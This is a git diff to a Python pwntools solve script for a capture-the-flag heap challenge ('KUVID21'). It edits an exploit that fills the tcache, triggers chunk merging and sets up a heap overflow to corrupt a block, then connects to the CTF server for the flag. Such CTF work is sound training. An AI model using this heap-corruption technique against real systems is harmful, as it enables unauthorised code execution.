@@ -62,19 +62,16 @@ class Challenge:
 
 def solve(challenge):
 
-    # The virus allocates 0x100 bytes long blocks, if we 
-    # fill up the 7 slots of the TCACHE, the next blocks of
-    # this size will be moved to the small bucket list.
-    # When freed, those blocks will merge free chunks before them
+    # let the virus spread 7 times so that we can free these blocks
+    # to fill the tcache. later blocks of this size will be moved
+    # to the small bucket list, and will do chunk merging
 
     blocks_to_fill_tcache = challenge.spread_virus(7)
     
-    # separates the blocks to be kept in the TCACHE
     challenge.infect(b'x'*7, b'w'*7, f'e' * 0x22)
-
     block_to_be_corrupted = challenge.spread_virus(1)[0]
 
-    challenge.infect(b'\x00', b'\x00', f'V4CC1N3V4CC1N3V4CC1N3V4CC1N3V4CC1N3')
+    challenge.infect(b'x'*7, b'w'*7, f'V4CC1N3V4CC1N3V4CC1N3V4CC1N3V4CC1N3')
 
     block_with_ptr_to_block_to_be_corrupted = challenge.spread_virus(1)[0]
     overflow_block_position = challenge.infect(b'x'*7, b'w'*7, f'e'*0x22)
@@ -85,6 +82,7 @@ def solve(challenge):
         block.cure()
 
     block_with_ptr_to_block_to_be_corrupted.cure()
+
     block_to_be_corrupted.cure()
 
     overflow_block_position.cure()
@@ -128,6 +126,8 @@ def solve(challenge):
 
 
 pwn.context.log_level = 'error'
+
+
 conn = pwn.remote('challenges.crysys.hu', 5009)
 # conn = pwn.process('./KUVID21')
 flag = solve(Challenge(conn))
